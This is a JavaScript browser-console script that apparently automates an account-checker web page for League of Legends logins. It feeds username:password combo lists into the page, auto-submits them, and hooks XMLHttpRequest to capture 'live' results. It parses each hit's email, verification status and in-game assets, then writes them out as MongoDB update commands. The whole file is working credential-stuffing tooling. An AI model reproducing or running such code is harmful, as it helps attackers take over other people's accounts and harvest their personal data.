(async () => {
  const copyToClipboard = (str) => {
    const el = document.createElement("textarea");
    el.value = str;
    document.body.appendChild(el);
    el.select();
    document.execCommand("copy");
    document.body.removeChild(el);
  };
  const list = document.getElementById("cclist");
  const server = document.getElementById("server");
  let accounts = []

  const serverMapper = {
    "1": (url) => (url || "").startsWith("https://br.op.gg"),
    "2": (url) => (url || "").startsWith("https://eune.op.gg"),
    "3": (url) => (url || "").startsWith("https://euw.op.gg"),
    "4": (url) => (url || "").startsWith("https://jp.op.gg"),
    "5": (url) => (url || "").startsWith("https://www.op.gg"),
    "6": (url) => (url || "").startsWith("https://lan.op.gg"),
    "7": (url) => (url || "").startsWith("https://las.op.gg"),
    "8": (url) => (url || "").startsWith("https://na.op.gg"),
    "9": (url) => (url || "").startsWith("https://oce.op.gg"),
    "11": (url) => (url || "").startsWith("https://ru.op.gg"),
    "12": (url) => (url || "").startsWith("https://tr.op.gg"),
  };
  let updates = [];
  const getUpdate = (data) =>
    updates
      .map(
        (update) =>
          `db.Accounts.updateOne(${JSON.stringify(
            update.where
          )}, ${JSON.stringify(update.set)})`
      )
      .join(";\n");

  const oldXHR = window.XMLHttpRequest;
  function newXHR() {
    var realXHR = new oldXHR();
    realXHR.addEventListener(
      "readystatechange",
      function () {
        if (realXHR.readyState !== realXHR.DONE) return;
        try {
          if (realXHR.status < 200 || realXHR.status > 299)
            throw new Error("Not 200");
          const body = JSON.parse(realXHR.response);
          console.log(body);
          if (body.sonuc !== "canli") return;
          const table = document.createElement("table");
          table.innerHTML = body.icerik;
          const trs = table.getElementsByTagName("tr");
          const newUsernames = [];
          for (let i = 0; i < trs.length; i += 1) {
            const tr = trs[i];
            const [, userData, capture] = tr.getElementsByTagName("td");
            const [UserName] = userData.innerHTML.split(":");
            newUsernames.push(UserName);
            let [
              RP,
              BlueEssence,
              Level,
              RefundsRemaining,
              TotalChamps,
              TotalSkins,
              Email,
              EmailVerified,
            ] = capture.innerHTML.split("<br>");
            updates.push({
              where: { UserName },
              set: {
                $set: {
                  // Level: +Level.split(":")[1].trim() || 0,
                  // RP: +RP.split(":")[1].trim() || 0,
                  // BlueEssence: +BlueEssence.split(":")[1].trim() || 0,
                  // RefundsRemaining: +RefundsRemaining.split(":")[1].trim() || 0,
                  // TotalChamps: +TotalChamps.split(":")[1].trim() || 0,
                  // TotalSkins: +TotalSkins.split(":")[1].trim() || 0,
                  Email: Email.split(":")[1].trim() || "",
                  EmailVerified:
                    EmailVerified.split(":")[1].trim() === "Verified",
                },
              },
            });
            console.log(updates);
            console.clear();
            console.log(getUpdate(updates));
          }
          accounts = accounts.filter(
            (account) => !newUsernames.includes(account.UserName)
          );
        } catch (e) {}
      },
      false
    );
    return realXHR;
  }
  window.XMLHttpRequest = newXHR;

  console.clear();
  function startQuery(accs) {
    if (!accs) return;
    if (!serverMapper[list.value]) return;
    server.value = list.value;
    const submit = document.getElementById("submit");
    let comboText = "";
    for (let i = 0; i < accs.length; i += 1) {
      if (i !== 0) comboText += "\n";
      comboText += accs[i].UserName + ":" + accs[i].Password;
    }
    list.value = comboText;
    submit.click();
  }
  const start = () => {
    startQuery(accounts);
  };
  console.clear();
  console.log("accounts", accounts);
  list.addEventListener("click", start);
})();
